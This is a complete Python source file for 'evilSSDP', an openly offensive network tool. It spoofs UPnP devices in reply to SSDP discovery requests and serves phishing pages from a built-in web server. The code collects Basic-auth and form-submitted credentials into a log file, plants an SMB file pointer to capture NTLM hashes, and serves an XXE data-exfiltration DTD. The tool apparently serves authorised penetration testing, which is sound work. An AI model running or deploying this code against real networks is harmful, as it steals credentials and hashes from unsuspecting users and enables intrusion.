#!/usr/bin/env python3

import sys
if sys.version_info < (3, 0):
    print("\nSorry mate, you'll need to use Python 3+ on this one...\n")
    sys.exit(1)

from multiprocessing import Process
from string import Template
from http.server import BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from http.server import HTTPServer
from email.utils import formatdate
from time import sleep
from ipaddress import ip_address
import os,re,argparse,socket,struct,time,re,signal,base64;

banner = r'''
___________     .__.__    _________ _________________ __________
\_   _____/__  _|__|  |  /   _____//   _____/\______ \\______   \
 |    __)_\  \/ /  |  |  \_____  \ \_____  \  |    |  \|     ___/
 |        \\   /|  |  |__/        \/        \ |    `   \    |
/_______  / \_/ |__|____/_______  /_______  //_______  /____|
        \/                      \/        \/         \/

...by initstring (gitlab.com/initstring)
Additional contributors: Dwight Hohnstein
'''

print(banner)

#############################           Global Variable Declarations           #############################
class bcolors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    ORANGE = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
okBox = bcolors.BLUE +      '[*] ' + bcolors.ENDC
noteBox = bcolors.GREEN +   '[+] ' + bcolors.ENDC
warnBox = bcolors.ORANGE +  '[!] ' + bcolors.ENDC
msearchBox = bcolors.BLUE + '[M-SEARCH]     ' + bcolors.ENDC
xmlBox = bcolors.GREEN +    '[XML REQUEST]  ' + bcolors.ENDC
phishBox = bcolors.RED +    '[PHISH HOOKED] ' + bcolors.ENDC
credsBox = bcolors.RED +    '[CREDS GIVEN]  ' + bcolors.ENDC
xxeBox = bcolors.RED +      '[XXE VULN!!!!] ' + bcolors.ENDC
exfilBox = bcolors.RED +    '[EXFILTRATION] ' + bcolors.ENDC

parser = argparse.ArgumentParser()
parser.add_argument('interface', type=str, help='Network interface to listen on.', action='store')
parser.add_argument('-p', '--port', type=str, default=8888, help='Port for HTTP server. Defaults to 8888.'
                    , action='store')
parser.add_argument('-t', '--template', type=str, default='office365', help='Name of a folder in the templates \
                    directory. Defaults to "office365". This will determine xml and phishing pages used.'
                     , action='store')
parser.add_argument('-s', '--smb', type=str, help='IP address of your SMB server. Defalts to the \
                    primary address of the "interface" provided.', action='store')
parser.add_argument('-b', '--basic', default=False, action="store_true", help="Enable base64 authentication for \
                    templates and write credentials to creds.txt")
parser.add_argument("-r", "--realm", type=str, default="Microsoft Corporation", help="Realm to appear when prompting \
                    users for authentication via base64 auth.", action="store")
parser.add_argument("-u", "--url", type=str, default="", help="Add javascript to the template to redirect from the \
                    phishing page to the provided URL.", action="store")
args = parser.parse_args()

charWhitelist = re.compile('[^a-zA-Z0-9 ._-]')        # Defining a list of expected characters for a network device 
interface = charWhitelist.sub('', args.interface)     # Avoiding command injection vulnerabilities
localPort = int(args.port)
templateDir = os.path.dirname(__file__) + '/templates/' + args.template
isAuth = args.basic
realm = args.realm
redirectUrl = args.url

if not os.path.isdir(templateDir):
    print(warnBox + "Sorry, that template directory does not exist. Please double-check and try again.")
    sys.exit()
#############################         End Global Variable Declarations          #############################


class SSDPListener:
    """
    This class object will bind to the SSDP-spec defined multicast address and port. We can then receive data from
    this object, which will be capturing the UDP multicast traffic on a local network. Processing is handled in
    the main() function below.
    """
    def __init__(self, localIp, localPort):
        self.sock = None
        self.knownHosts = []
        self.localIp = localIp
        self.localPort = localPort
        ssdpPort = 1900			# This is defined by the SSDP spec, do not change
        mcastGroup='239.255.255.250'	# This is defined by the SSDP spec, do not change
        serverAddress = ('', ssdpPort)
        
        # Create the socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Bind to the server address
        self.sock.bind(serverAddress)
        
        # Tell the operating system to add the socket to
        # the multicast group on for the interface on the specific IP.
        group = socket.inet_aton(mcastGroup)
        mreq = struct.pack('4s4s', group, socket.inet_aton(self.localIp))
        self.sock.setsockopt(
            socket.IPPROTO_IP,
            socket.IP_ADD_MEMBERSHIP,
            mreq)

class MultiThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """
    Setting up this definition allows us to serve multiple HTTP requests in parallel.
    Without this, a client device may hang the HTTP server, blocking other devices from properly accessing and
    parsing the XML files.
    """
    pass

def MakeHTTPClass(deviceXML, serviceXML, phishPage, exfilDTD):
    """
    The class below is being built inside a function to allow us to easily pass variables to built-in functions.
    This will build a multi-threaded HTTP server listening for specific requests for the XML files we are serving.

    When used with the 'xxe' template, it will also notify on apps that have potential 0-day XXE vulnerabilities
    in their XML parsing engines. If you see that warning, it may be CVE time!

    Any requests to the HTTP server other than those defined will be given the phishing page. The phishing page
    can optionally request an interactive logon if the "-b / --basic" has been specified.

    The phishing page the devices SHOULD be requesting is 'present.html' but we will serve it to all requests,
    in case a curious users sees the reference and browses there manually.
    """
    class DeviceDescriptor(BaseHTTPRequestHandler):
        def do_GET(self):
            localIp,localPort = self.server.server_address
            if self.path == '/ssdp/device-desc.xml':                    # Parsed automatically by all SSDP apps
                self.send_response(200)
                self.send_header('Content-type', 'application/xml')
                self.end_headers()
                self.wfile.write(deviceXML.encode())
            elif self.path == '/ssdp/service-desc.xml':                 # Not yet implemented
                self.send_response(200)
                self.send_header('Content-type', 'application/xml')
                self.end_headers()
                self.wfile.write(serviceXML.encode())
            elif self.path == '/ssdp/xxe.html':                         # Access indicates XXE vulnerability
                self.send_response(200)
                self.send_header('Content-type', 'application/xml')
                self.end_headers()
                self.wfile.write('.'.encode())
            elif self.path == '/ssdp/data.dtd':                         # Used for XXE exploitation
                self.send_response(200)
                self.send_header('Content-type', 'application/xml')
                self.end_headers()
                self.wfile.write(exfilDTD.encode())
            else:
                if isAuth:                                              # If user enables -b/--basic in CLI args
                    if 'Authorization' not in self.headers:             # If creds not given, ask for them
                        self.process_authentication()
                        self.wfile.write("Unauthorized.".encode())
                    elif 'Basic ' in self.headers['Authorization']:     # Return phishing page after getting creds
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        self.wfile.write(phishPage.encode()) 
                    else:
                        self.send_response(500)
                        self.wfile.write("Something happened.".encode())
                else:                                                   # Return phishing page for everything else
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(phishPage.encode())

        def do_POST(self):
            if self.path == '/ssdp/do_login.html':                      # For phishing templates to POST creds to
                self.send_response(301)
                self.send_header('Location','http://{}:{}/present.html'.format(localIp, localPort))
                self.end_headers()

        def process_authentication(self):
            """
            Will prompt user for credentials, causing execution to go back to the do_GET funtion for further
            processing.
            """
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm=\"{}\"'.format(realm))
            self.send_header('Content-type','text/html')
            self.end_headers()

        def write_log(self, data):
            """
            Will append important info to a log file. This includes credentials given via basic auth as well as
            XXE vulnerabilities.
            """
            with open('logs-essdp.txt', 'a') as logFile:
                timeStamp = formatdate(timeval=None, localtime=True, usegmt=False)
                logFile.write(timeStamp + ":    " + data + "\n")
                logFile.close()
    
        def log_message(self, format, *args):
            """
            Overwriting the built in function to provide useful feedback inside the text UI.
            Providing the 'User Agent' is helpful in understanding the types of devices that are interacting
            with evilSSDP.

            The most important stuff (credentials submitted and XXE vulns) are logged to a text file in the
            working directory.
            """
            address = self.address_string()
            agent = self.headers['user-agent']
            verb = self.command
            path = self.path
            if 'xml' in self.path:
                print(xmlBox + "Host: {}, User-Agent: {}".format(address, agent))
                print("               {} {}".format(verb, path))
            elif 'xxe.html' in self.path:
                data = xxeBox + "Host: {}, User-Agent: {}\n".format(address, agent)
                data += "               {} {}".format(verb, path)
                print(data)
                self.write_log(data)
            elif 'do_login' in self.path:
                contentLength = int(self.headers['Content-Length'])
                postBody = self.rfile.read(contentLength)
                credentials = postBody.decode('utf-8')
                data = credsBox + "HOST: {}, CREDS: {}".format(address, credentials)
                print(data)
                self.write_log(data)
            elif 'data.dtd' in self.path:
                data = xxeBox + "Host: {}, User-Agent: {}\n".format(address, agent)
                data += "               {} {}".format(verb, path)
                print(data)
                self.write_log(data)
            elif 'exfiltrated' in self.path:
                data = exfilBox + "Host: {}, User-Agent: {}\n".format(address, agent)
                data += "               {} {}".format(verb, path)
                print(data)
                self.write_log(data)
            else:
                print(phishBox + "Host: {}, User-Agent: {}".format(address, agent))
                print("               {} {}".format(verb, path))
            
            if 'Authorization' in self.headers:
                basic, encoded = self.headers['Authorization'].split(" ")
                plaintext = base64.b64decode(encoded).decode()
                data = credsBox + "HOST: {}, CREDS: {}".format(address, plaintext)
                print(data)
                self.write_log(data)

    return DeviceDescriptor 

def get_ip():
    """
    This function will attempt to automatically get the IP address of the provided interface.
    This is used for serving the XML files and also for the SMB pointer, if not specified.
    """
    try:
        localIp = re.findall(r'inet (?:addr:)?(.*?) ', os.popen('ifconfig ' + interface).read())[0]
    except Exception:
        print(warnBox + "Could not get network interface info. Please check and try again.")
        sys.exit()
    return localIp

def set_smb():
    """
    This function sets the IP address of the SMB server that will be used in the phishing page.
    evilSSDP does not provide an SMB server itself - it only points somewhere. You must host your own SMB
    server with something like Impacket.
    """
    if args.smb:
        if ip_address(args.smb):
            smbServer = args.smb
        else:
            print("Sorry, that is not a valid IP address for your SMB server.")
            sys.exit()
    else:
        smbServer = localIp
    return(smbServer)

def process_data(listener, data, address):
    """
    This function parses the raw data received on the SSDPListener class object. If the M-SEARCH header is found,
    it will look for the specific 'Service Type' (ST) being requested and call the function to reply back, telling
    the client that we have the device type they are looking for.

    If it can't extract the ST, it will reply back with a generic 'ssdp:all' device type and hope for the best.

    The function will log the first time a client does a specific type of M-SEARCH, but after that it will be silent.
    This keeps the output more readable, as clients can get chatty.
    """
    (remoteIp,remotePort) = address
    if 'M-SEARCH' in str(data):
        try:
            requestedST = re.findall(r'\\r\\nST:(.*?)\\r\\n', str(data))[0].strip()
        except:
            requestedST = 'ssdp:all'
        if (address[0],requestedST) not in listener.knownHosts:
            print(msearchBox + "New Host {}, Service Type: {}".format(remoteIp, requestedST))
            listener.knownHosts.append((address[0], requestedST))
        send_location(listener, address, requestedST)

def send_location(listener, address, requestedST):
    """
    This function replies back to clients letting them know where they can access more information about our device.
    The key here is the 'LOCATION' header and the 'ST' header.

    When a client receives this information back on the port they initiated a discover from, they will go to that
    location and parse the XML file.
    """
    URL = 'http://{}:{}/ssdp/device-desc.xml'.format(localIp, localPort)
    lastSeen = str(time.time())
    dateFormat = formatdate(timeval=None, localtime=False, usegmt=True)
    reply = 'HTTP/1.1 200 OK\r\n'
    reply += 'CACHE-CONTROL: max-age=1800\r\n'
    reply += 'DATE: ' + dateFormat + '\r\n'
    reply += 'EXT: \r\n'
    reply += 'LOCATION: ' + URL + '\r\n'
    reply += 'SERVER: Linux/3.10.96+, UPnP/1.0, eSSDP/0.1\r\n'
    reply += 'ST: {}\r\n'.format(requestedST)
    reply += 'USN: uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563:upnp-rootdevice\n'
    reply += 'BOOTID.UPNP.ORG: 0\r\n'
    reply += 'CONFIGID.UPNP.ORG: 1\r\n'
    reply += '\r\n\r\n'
    reply = bytes(reply, 'utf-8')
    listener.sock.sendto(reply, address)

def buildDeviceXML(smbServer):
    """
    Builds the device descriptor XML file.
    """
    variables = {'localIp': localIp,
		 'localPort': localPort,
                 'smbServer': smbServer}
    fileIn = open(templateDir + '/device.xml')
    template = Template(fileIn.read())
    xmlFile = template.substitute(variables)
    return xmlFile

def buildServiceXML():
    """
    Builds the service descriptor XML file. ***Not yet implemented in evilSSDP***
    """
    if 'service.xml' in templateDir:
        variables = {'localIp': localIp,
                     'localPort': localPort}
        fileIn = open(templateDir + '/service.xml')
        template = Template(fileIn.read())
        xmlFile = template.substitute(variables)
    else:
        xmlFile = '.'
    return xmlFile

def buildPhish(smbServer):
    """
    Builds the phishing page served when users open up an evil device.
    """
    variables = {'smbServer': smbServer,
                 'redirectUrl': redirectUrl}
    fileIn = open(templateDir + '/present.html')
    template = Template(fileIn.read())
    phishPage = template.substitute(variables)
    return phishPage

def buildExfil():
    """
    Builds the required page for data exfiltration when used with the xxe-exfil template.
    """
    if 'xxe-exfil' in templateDir:
        variables = {'localIp': localIp,
            	 'localPort': localPort}
        fileIn = open(templateDir + '/data.dtd')
        template = Template(fileIn.read())
        exfilPage = template.substitute(variables)
    else:
        exfilPage = '.'
    return exfilPage

def serve_html(deviceXML, serviceXML, phishPage, exfilDTD):
    """
    Starts the web server for delivering XML files and the phishing page.
    """
    HTTPClass = MakeHTTPClass(deviceXML, serviceXML, phishPage, exfilDTD)
    MultiThreadedHTTPServer.allow_reuse_address = True
    descriptor = MultiThreadedHTTPServer((localIp, localPort), HTTPClass)
    descriptor.serve_forever()

def print_details(smbServer):
    print("\n\n")
    print("########################################")
    print(okBox + "EVIL TEMPLATE:           {}".format(templateDir))
    print(okBox + "MSEARCH LISTENER:        {}".format(interface))
    print(okBox + "DEVICE DESCRIPTOR:       http://{}:{}/ssdp/device-desc.xml".format(localIp, localPort))
    print(okBox + "SERVICE DESCRIPTOR:      http://{}:{}/ssdp/service-desc.xml".format(localIp, localPort))
    print(okBox + "PHISHING PAGE:           http://{}:{}/ssdp/present.html".format(localIp, localPort))
    if redirectUrl:
        print(okBox + "REDIRECT URL:            {}".format(redirectUrl))
    if isAuth:
        print(okBox + "AUTH ENABLED, REALM:     {}".format(realm))
    if 'xxe-exfil' in templateDir:
        print(okBox + "EXFIL PAGE:              http://{}:{}/ssdp/data.dtd".format(localIp, localPort))
    else:
        print(okBox + "SMB POINTER:             file://///{}/smb/hash.jpg".format(smbServer))
    print("########################################")
    print("\n\n")

def listen_msearch():
    """
    Starts the listener object, receiving and processing UDP multicasts.
    """
    listener = SSDPListener(localIp, localPort)
    while True:
        data, address = listener.sock.recvfrom(1024)
        process_data(listener, data, address)


def main():
    global localIp
    localIp = get_ip()                      # Extract IP address of provided interface
    smbServer = set_smb()                   # Choose which IP we will inject into IMG tags for phishing
    deviceXML = buildDeviceXML(smbServer)   # Build the primary XML file parsed in all instances
    serviceXML = buildServiceXML()          # Not yet implemented, may be necessary for advanced future templates
    phishPage = buildPhish(smbServer)       # Build the phishing page displayed to users who click evil devices
    exfilDTD = buildExfil()                 # Used in 0-day XXE detection to resolve exfiltration variables
    print_details(smbServer)                # Provide details of our configuration on the CLI
    try:                                    # Spawn the web server and SSDP server as separate threads
        webServer = Process(target=serve_html, args=(deviceXML, serviceXML, phishPage, exfilDTD))
        ssdpServer = Process(target=listen_msearch, args=())
        webServer.start()
        ssdpServer.start()
        signal.pause()
    except (KeyboardInterrupt, SystemExit): # Allow for a graceful exit when pressing Ctrl-C
        print("\n" + warnBox + "Thanks for playing! Stopping threads and exiting...\n")
        webServer.terminate()
        ssdpServer.terminate()
        sleep(3)
        sys.exit()
    

if __name__ == "__main__":
    main()

